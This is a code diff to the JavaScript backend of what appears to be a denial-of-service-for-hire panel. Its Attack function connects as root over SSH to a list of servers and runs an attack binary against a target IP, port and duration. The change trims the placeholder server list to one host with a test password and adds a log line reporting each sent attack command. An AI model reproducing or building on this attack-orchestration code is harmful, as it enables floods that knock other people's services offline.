@@ -92,7 +92,7 @@ function LogAttack(username, ip, port, time, method) {
     }
 }
 
-function Attack(auth_token, ip, target, port, time, method) {
+function Attack(auth_token, ip, port, time, method) {
     if (IsAttacking(null, auth_token)) {
         return false;
     }
@@ -110,33 +110,15 @@ function Attack(auth_token, ip, target, port, time, method) {
 
     const servers = [
         {
-            host: "1.1.1.1",
+            host: "0.0.0.0",
             port: 22,
             username: 'root',
-            password: 'SERVER-PASSWORD'
-        },
-        {
-            host: "2.2.2.2",
-            port: 22,
-            username: 'root',
-            password: 'SERVER-PASSWORD'
-        },
-        {
-            host: "3.3.3.3",
-            port: 22,
-            username: 'root',
-            password: 'SERVER-PASSWORD'
-        },
-        {
-            host: "4.4.4.4",
-            port: 22,
-            username: 'root',
-            password: 'SERVER-PASSWORD'
+            password: 'test'
         }
     ];
 
     servers.forEach(server => {
-        const command = `./${method} ${target} ${port} ${time}`;
+        const command = `./${method} ${ip} ${port} ${time}`;
         const conn = new Client();
 
         conn.on('ready', () => {
@@ -145,8 +127,9 @@ function Attack(auth_token, ip, target, port, time, method) {
                     console.error('Error executing command:', err.message);
                     conn.end();
                     return; // Exit the function early if there's an error
+                } else if (!err) {
+                    console.log(`ROOT-SERVER-ONLINE [${server.host}]: SENT ${command}`);
                 }
-
                 stream
                     .on('close', (code, signal) => {
                         console.log(`Command closed with code ${code}, signal ${signal}`);
@@ -167,9 +150,6 @@ function Attack(auth_token, ip, target, port, time, method) {
             console.error(`ROOT-SERVER-OFFLINE [${server.host}]:`, err.message);
         }).connect(server);
     });
-
-    // Add your code to handle the actual attack logic here
-
     return true;
 }
 
